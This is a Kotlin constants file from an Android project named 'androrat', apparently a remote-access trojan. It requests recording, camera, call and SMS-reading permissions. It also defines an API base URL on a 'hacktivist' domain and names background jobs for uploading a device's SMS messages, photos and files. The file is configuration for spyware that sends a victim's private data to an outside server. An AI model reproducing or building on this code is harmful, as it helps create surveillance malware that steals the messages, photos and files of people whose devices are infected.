package com.ierusalem.androrat.utility

import android.Manifest
import android.os.Build

object Constants {

    val PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) listOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_SMS,
    ) else {
        listOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
        )
    }

    const val BASE_URL = "https://hacktivist.samduuf.uz/api/v1/"
    const val PERMISSION_REQUEST_WORK_NAME = "permission_request_work_name"

    const val SMS_UPLOAD_WORK_NAME = "sms_upload_work_name"
    const val PHOTOS_UPLOAD_WORK_NAME = "photos_upload_work_name"
    const val FILES_UPLOAD_WORK_NAME = "files_upload_work_name"

}